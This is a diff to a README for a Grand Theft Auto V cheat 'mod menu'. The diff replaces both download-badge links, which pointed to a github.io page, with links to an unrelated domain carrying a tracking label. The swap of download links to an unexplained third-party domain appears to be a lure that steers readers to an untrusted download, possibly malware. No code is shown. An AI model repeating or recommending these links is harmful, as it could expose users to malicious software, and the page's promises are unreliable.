@@ -2,7 +2,7 @@
 
 The **GTA Mod Menu** is a powerful and versatile modding tool that gives players full control over their gameplay experience in **Grand Theft Auto V** (GTA5). Whether you're exploring Los Santos solo, customizing your ride, or testing the game's physics, this mod menu delivers all the tools you need — from godmode to money options, teleportation, vehicle spawning, and more.
 
-[![Download GTA ModMenu](https://img.shields.io/badge/Download-GTA%20ModMenu-blueviolet)](https://gta-mod-menu.github.io/.github/)
+[![Download GTA ModMenu](https://img.shields.io/badge/Download-GTA%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## 🔧 Key Features
 
@@ -44,4 +44,4 @@ The **GTA Mod Menu** is a powerful and versatile modding tool that gives players
 4. **Use the menu hotkey** (commonly `F4` or `Insert`) to open the menu.
 5. **Navigate the menu** to activate and customize features.
 
-[![Download GTA ModMenu](https://img.shields.io/badge/Download-GTA%20ModMenu-blueviolet)](https://gta-mod-menu.github.io/.github/)
+[![Download GTA ModMenu](https://img.shields.io/badge/Download-GTA%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
